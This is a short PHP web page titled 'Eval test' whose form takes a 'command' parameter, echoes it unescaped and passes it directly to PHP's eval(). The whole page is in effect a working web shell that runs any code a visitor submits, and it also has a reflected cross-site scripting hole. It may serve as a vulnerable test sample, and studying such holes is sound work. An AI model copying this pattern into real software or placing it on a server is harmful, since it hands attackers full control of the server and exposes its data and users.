<HTML>
<HEAD>
<TITLE>Eval test</TITLE>
</HEAD>
<BODY>
<center><h3>Eval test</h3></center>
<hr>
<form name="syst" action="evaltest.php" method="get">
Command: <input name="command" size=50>
<input type="submit" value="Find">
</form>
<hr>

<?
 if (isset($_GET['command']))
 {
  $command = $_GET['command'];
  print("Executed command: <b>$command</b><P>");
  eval($command);
 }
?>

</BODY>
</HTML>